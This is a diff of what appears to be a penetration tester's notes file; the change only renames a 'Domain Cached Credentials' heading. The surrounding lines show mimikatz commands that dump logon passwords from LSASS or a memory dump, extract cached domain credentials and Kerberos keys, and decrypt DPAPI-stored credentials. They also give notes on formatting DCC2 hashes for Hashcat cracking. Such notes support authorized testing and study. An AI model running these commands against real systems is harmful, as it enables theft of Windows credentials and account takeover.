@@ -8,7 +8,7 @@
 mimikatz sekurlsa::logonpasswords
 # Logonpasswords on lsass dmp
 mimikatz "log log.txt" "sekurlsa::minidump C:\Users\patri\Downloads\sql2.bin" "sekurlsa::logonPasswords"
-# Get [[Domain Cached Credentials]]
+# Get [[Cached Domain Credentials]]
 mimikatz lsadump::cache
 # Get [[eKeys]] Kerberos aes265_hmac
 mimikatz sekurlsa::ekeys
@@ -262,7 +262,7 @@ SID               : S-1-5-21-3318663386-1925972964-1342212060-1001
 dpapi::cred /in:C:\Users\patri\AppData\Local\Microsoft\Credentials\040F76937B2E54B70658AF91D1BEBCCF /masterkey:877b54004621de000414e1e85af59928027d55f6be31beafd8007ad21779e3eb75ec95b58ebcedf433[SNIP]21f9ba45877b1426c72cb
 ``````
 
-## [[Domain Cached Credentials]]
+## [[Cached Domain Credentials]]
 Unfortunately, the hash format is not NTLM.
 
 To crack these with [[Hashcat]], we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<MsCacheV2hash>`.
